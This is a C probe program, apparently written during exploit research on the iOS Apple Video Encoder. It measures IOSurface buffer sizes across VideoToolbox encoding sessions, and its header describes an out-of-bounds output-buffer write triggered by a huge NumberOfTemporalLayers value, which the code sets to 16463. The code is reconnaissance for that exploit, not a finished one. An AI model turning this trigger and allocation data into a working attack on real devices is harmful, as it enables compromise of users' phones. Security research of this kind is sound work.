/*
 * ave_iosurface_probe.c — AVE IOSurface Allocation Analysis
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Understand DMA buffer allocation patterns for AVE exploit
 *
 * Key finding: Temporal layers don't change IOSurface (input buffer) size.
 * The OOB is in the output buffer, not the input buffer.
 * When NumberOfTemporalLayers is absurdly large, the AVE coprocessor
 * writes more encoded output data than the allocated output buffer holds.
 *
 * Device results (Nov 20, 2026):
 *   1920x1080 → 8,294,464 byte IOSurface (same with temporal=0 or 16463)
 *   4096x2160 → 35,389,504 byte IOSurface
 *   8192x4320 → 141,557,824 byte IOSurface
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface \
 *     -o ave_iosurface_probe ave_iosurface_probe.c -Wno-deprecated-declarations
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef uint32_t IOSurfaceID;
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef);
extern size_t IOSurfaceGetWidth(IOSurfaceRef);
extern size_t IOSurfaceGetHeight(IOSurfaceRef);
extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef);
extern size_t IOSurfaceGetPlaneCount(IOSurfaceRef);
extern size_t IOSurfaceGetWidthOfPlane(IOSurfaceRef, size_t);
extern size_t IOSurfaceGetHeightOfPlane(IOSurfaceRef, size_t);
extern size_t IOSurfaceGetBytesPerRowOfPlane(IOSurfaceRef, size_t);

static FILE *out;

static void p(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fflush(out);
}

static void probe_vtb_session(int width, int height, int use_hevc, int temporal_layers) {
    CMVideoCodecType codec = use_hevc ? kCMVideoCodecType_HEVC : kCMVideoCodecType_H264;
    const char *cn = use_hevc ? "HEVC" : "H264";
    p("\n--- VTB %dx%d %s temporal=%d ---\n", width, height, cn, temporal_layers);

    CFMutableDictionaryRef srcAttrs = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef ioSurfProps = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferIOSurfacePropertiesKey, ioSurfProps);
    CFRelease(ioSurfProps);
    int fmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fmtNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferPixelFormatTypeKey, fmtNum);
    CFRelease(fmtNum);

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, codec,
        NULL, srcAttrs, NULL, NULL, NULL, &session);
    CFRelease(srcAttrs);

    if (st != noErr || !session) {
        p("  Create failed: %d\n", (int)st);
        return;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    if (temporal_layers > 0) {
        CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &temporal_layers);
        st = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), n);
        CFRelease(n);
        p("  temporal_layers=%d set: %d\n", temporal_layers, (int)st);
    }

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    p("  Prepare: %d\n", (int)st);

    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(session);
    if (!pool) {
        p("  No PixelBufferPool\n");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferRef pb = NULL;
    CVReturn cv = CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
    p("  Pool create pb: %d\n", (int)cv);
    if (cv != kCVReturnSuccess || !pb) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    p("  PB width: %zu, height: %zu\n",
        CVPixelBufferGetWidth(pb), CVPixelBufferGetHeight(pb));
    p("  PB bytesPerRow: %zu\n", CVPixelBufferGetBytesPerRow(pb));
    p("  PB dataSize: %zu\n", CVPixelBufferGetDataSize(pb));

    IOSurfaceRef surf = CVPixelBufferGetIOSurface(pb);
    if (surf) {
        p("  IOSurface ID: %u\n", IOSurfaceGetID(surf));
        p("  IOSurface allocSize: %zu\n", IOSurfaceGetAllocSize(surf));
        p("  IOSurface w: %zu h: %zu bpr: %zu\n",
            IOSurfaceGetWidth(surf), IOSurfaceGetHeight(surf), IOSurfaceGetBytesPerRow(surf));
        p("  IOSurface planeCount: %zu\n", IOSurfaceGetPlaneCount(surf));
    } else {
        p("  No IOSurface backing\n");
    }

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    snprintf(path, sizeof(path), "%s/Documents/ave_iosurface.txt", home);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE IOSurface Probe ===\n");
    p("PID: %d\n\n", getpid());

    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("kern.osversion: %s\n", buf);

    probe_vtb_session(1920, 1080, 0, 0);
    probe_vtb_session(1920, 1080, 1, 0);
    probe_vtb_session(1920, 1080, 1, 2);
    probe_vtb_session(1920, 1080, 1, 16463);
    probe_vtb_session(4096, 2160, 0, 0);
    probe_vtb_session(4096, 2160, 1, 0);
    probe_vtb_session(8192, 4320, 0, 0);

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
